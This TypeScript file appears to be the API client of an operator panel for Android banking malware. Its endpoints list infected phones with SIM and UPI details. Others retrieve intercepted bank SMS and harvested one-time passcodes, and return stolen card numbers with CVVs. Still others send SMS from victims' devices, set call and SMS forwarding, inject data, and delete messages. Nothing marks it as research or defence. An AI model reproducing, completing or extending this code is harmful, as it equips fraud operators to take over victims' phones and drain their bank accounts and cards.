// Lightweight api-server client (Bearer cyberzone_auth). No firebase SDK.
const AUTH_KEY = "cyberzone_auth";

export function authHeaders(
  extra: Record<string, string> = {}
): Record<string, string> {
  const headers: Record<string, string> = { ...extra };
  try {
    const raw = localStorage.getItem(AUTH_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed.telegramId && parsed.sessionId) {
        headers["Authorization"] =
          `Bearer ${parsed.telegramId}:${parsed.sessionId}`;
      }
    }
  } catch {
    /* ignore malformed auth */
  }
  return headers;
}

export async function apiFetch<T = any>(
  path: string,
  init: { method?: string; body?: any; headers?: Record<string, string> } = {}
): Promise<T> {
  const headers: Record<string, string> = { ...authHeaders(), ...init.headers };
  let body: BodyInit | undefined;
  if (init.body && typeof init.body === "object") {
    headers["Content-Type"] = "application/json";
    body = JSON.stringify(init.body);
  } else if (init.body != null) {
    body = init.body;
  }
  const r = await fetch(path, { method: init.method, body, headers });
  const ct = r.headers.get("content-type") || "";
  const data = ct.includes("application/json")
    ? await r.json().catch(() => null)
    : await r.text();
  if (!r.ok) {
    throw new Error((data && data.error) || `HTTP ${r.status}`);
  }
  return data as T;
}

// ── typed panel endpoints ────────────────────────────────────────────────────

export interface PanelDevice {
  id: string;
  model: string;
  phone: string;
  upi: string;
  battery: string;
  sim1: string;
  sim2: string;
  isOnline: boolean;
  androidV?: string;
  sdkV?: string;
  ip_address?: string;
  storage?: string;
  cpu_arch?: string;
  isRoot?: boolean;
  isSdCard?: boolean;
  joined?: string;
  lastPing?: number;
  label?: string;
  group?: string;
  deviceName?: string;
  colorTag?: string;
  ownerTelegramId?: string;
  webview?: boolean;
  raw: Record<string, any>;
}

export interface Bootstrap {
  success: boolean;
  devices: PanelDevice[];
  messageIds: string[];
  pins: string[];
  bankSms: number;
  totals: {
    online: number;
    offline: number;
    cards: number;
    upi: number;
    today: number;
  };
  instances: { id: string; name: string }[];
}

export const getBootstrap = () => apiFetch<Bootstrap>("/api/panel/bootstrap");
export const getPins = () =>
  apiFetch<{ success: boolean; pins: string[] }>("/api/panel/pins");
export const setPin = (deviceId: string, pinned: boolean) =>
  apiFetch(`/api/panel/pins/${encodeURIComponent(deviceId)}`, {
    method: "PUT",
    body: JSON.stringify({ pinned }),
    headers: { "Content-Type": "application/json" },
  });
export const getDevice = (id: string) =>
  apiFetch<{
    success: boolean;
    device: PanelDevice;
    messages: Record<string, any>;
  }>(`/api/panel/device/${encodeURIComponent(id)}`);

export const patchDevice = (id: string, fields: Record<string, any>) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}/update`, {
    method: "POST",
    body: fields,
  });
export const pingDevice = (id: string) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}/ping`, {
    method: "POST",
  });
export const sendSms = (id: string, to: string, message: string, sim = 0) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}/send-sms`, {
    method: "POST",
    body: { to, message, sim },
  });
export const setForward = (
  id: string,
  type: "call" | "sms",
  to: string,
  sim = 0,
  active = true
) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}/forward`, {
    method: "POST",
    body: { type, to, sim, active },
  });
export const injectDevice = (id: string, fields: Record<string, any>) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}/inject`, {
    method: "POST",
    body: { fields },
  });
export const setAlert = (id: string, enabled: boolean) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}/alert`, {
    method: "PUT",
    body: { enabled },
  });
export const deleteDevice = (id: string) =>
  apiFetch(`/api/panel/device/${encodeURIComponent(id)}`, { method: "DELETE" });
export const deleteSms = (deviceId: string, key: string) =>
  apiFetch(
    `/api/panel/sms/${encodeURIComponent(deviceId)}/${encodeURIComponent(key)}`,
    { method: "DELETE" }
  );

export interface SmsRow {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  dbLabel: string;
}

export const getSms = () =>
  apiFetch<{ success: boolean; sms: SmsRow[] }>("/api/panel/sms");

export interface OtpRow {
  code: string;
  service: string;
  number: string;
  from: string;
  body: string;
  deviceId: string;
  date: number;
}

export const getOtps = () =>
  apiFetch<{
    success: boolean;
    otps: OtpRow[];
    devices: {
      id: string;
      model: string;
      isOnline: boolean;
      numbers: string[];
    }[];
  }>("/api/panel/otps");

export interface ScrapedCard {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  ownerTelegramId: string | null;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  ip: string;
  timestamp: string;
}

export interface ScrapedDevice {
  deviceId: string;
  model: string;
  phone: string;
  sim1: string;
  sim2: string;
  battery: string;
  ip: string;
  storage: string;
  androidV: string;
  joined: string;
  status: boolean;
  ownerTelegramId: string | null;
}

export const getScraped = () =>
  apiFetch<{
    success: boolean;
    cards: ScrapedCard[];
    devices: ScrapedDevice[];
  }>("/api/panel/scraped");
